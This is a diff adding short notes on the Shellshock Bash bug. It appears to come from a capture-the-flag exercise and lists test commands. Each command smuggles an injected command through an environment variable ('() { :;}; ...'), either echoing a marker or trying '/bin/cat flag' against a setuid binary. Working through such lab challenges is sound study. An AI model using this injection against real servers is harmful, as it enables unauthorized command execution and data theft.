@@ -1,0 +1,14 @@
+Shellsock, also known as Bashdoor, is a family of security bugs in the Unix Bash shell.
+Shellshock could enable an attacker to cause Bash to execute arbitrary
+commands and gain unauthorized access to many Internet-facing services, such as web servers, that use
+Bash to process requests.
+
+
+test with bash server
+1) env x='() { :;}; echo vulnerable' /bin/bash -c "echo this is a test"	# bash in bin/bash
+-> fair enough
+2) env x='() { :;}; echo vulnerable' ./bash -c "echo this is a test"	# bash in directory
+-> 
+3) env x='() { :;}; /bin/cat flag' ./bash -c "echo this is a test"
+-> /bin/cat: flag: Permission denied
+4) env x='() { :;}; /bin/cat flag' ./shellshock
